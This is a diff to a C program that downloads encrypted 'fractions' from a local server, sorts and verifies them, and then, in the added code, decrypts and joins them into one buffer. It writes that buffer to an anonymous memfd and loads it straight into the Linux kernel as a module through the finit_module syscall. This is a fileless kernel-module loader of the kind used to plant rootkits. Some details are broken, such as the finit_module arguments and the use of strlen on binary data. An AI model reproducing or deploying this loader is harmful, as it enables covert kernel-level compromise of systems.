@@ -1,15 +1,22 @@
+#define _GNU_SOURCE
 #include <stdlib.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <linux/module.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+#include <sys/mman.h>
 
 #include "../include/fraction.h"
 #include "../include/http.h"
 #include "../include/sock.h"
 #include "../include/utils.h"
 #include "../include/log.h"
+#include "../include/cipher.h"
 
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT "8000"
+#define SYS_init_module  __NR_init_module
 
 /* Helper functions to assist with cleanup, I hate cleanup */
 static void cleanup_char_array(char **array, int n_elem) {
@@ -26,6 +33,14 @@ static void cleanup_fraction_array(fraction_t *array, int n_elem) {
   free(array);
 }
 
+void print_bytes(const char *str) {
+    while (*str) {  // Recorrer la cadena hasta el final
+        printf("0x%02x ", (unsigned char)*str);  // Imprimir cada byte en formato hexadecimal
+        str++;  // Mover al siguiente carácter
+    }
+    printf("\n");
+}
+
 int main(void) {
   struct addrinfo hints, *ainfo;
   int sfd = -1; // to be extra professional
@@ -33,6 +48,9 @@ int main(void) {
   http_res_t http_post_res = {0};
   char **fraction_links = NULL;
   fraction_t *fractions = NULL;
+  char *module = NULL;
+  size_t total_size = 0;
+
 
   log_set_level(LOG_DEBUG);
   setup_hints(&hints);
@@ -56,7 +74,7 @@ int main(void) {
   }
 
   int num_links = count_lines(http_fraction_res.data) + 1;
-  fraction_links = malloc(num_links * sizeof(char *));
+  fraction_links = calloc(num_links,sizeof(char *));
   if (!fraction_links) {
     log_error("Failed to allocate memory for fraction links\n");
     goto cleanup;
@@ -83,7 +101,7 @@ int main(void) {
     }
   }
   log_info("Downloaded fractions");
-  
+
   qsort(fractions, lines_read, sizeof(fraction_t), compare_fractions);
 
   if (check_fractions(fractions, lines_read) != 0) { // if this works, s0s4 and skelly is to blame!
@@ -91,12 +109,53 @@ int main(void) {
     goto cleanup;
   }
   log_info("Verified fractions");
+
   for (int i=0; i<lines_read; i++) {print_fraction(fractions[i]);}
+
+  for(int i = 0; i < num_links; i++){
+      char *decryptvalue = (char *) decrypt_fraction(&fractions[i]);
+      if(decryptvalue == NULL){
+        log_error("Decryption process failed");
+        continue;
+      }
+      size_t decrypt_size = strlen(decryptvalue);
+      module = realloc(module, total_size + decrypt_size);
+      if(module == NULL){
+        log_error("Failed to allocate memory for module");
+        free(decryptvalue);
+        return 1;
+    }
+    memcpy(module + total_size, decryptvalue, decrypt_size);
+    total_size += decrypt_size;
+    free(decryptvalue);
+  }
+int fdlkm = memfd_create("lkmmod", 0);
+if (fdlkm < 0) {
+    perror("memfd_create failed");
+    return -1;
+}
+
+ssize_t written_bytes = write(fdlkm, module, total_size);
+if (written_bytes < 0) {
+    perror("Error writing to memfd");
+    close(fdlkm);
+    return -1;
+}
+if (syscall(SYS_finit_module, fdlkm, total_size, NULL) != 0) {
+    perror("Failed to init module");
+    close(fdlkm);
+    return -1;
+}
+    printf("Module loaded successfully\n");
+    free(module);
+
 
   http_free(&http_post_res);
   http_free(&http_fraction_res);
   cleanup_char_array(fraction_links, num_links);
   cleanup_fraction_array(fractions, lines_read);
+
+//  send_publickey(sfd,rsa);
 
   close(sfd);
   return EXIT_SUCCESS;
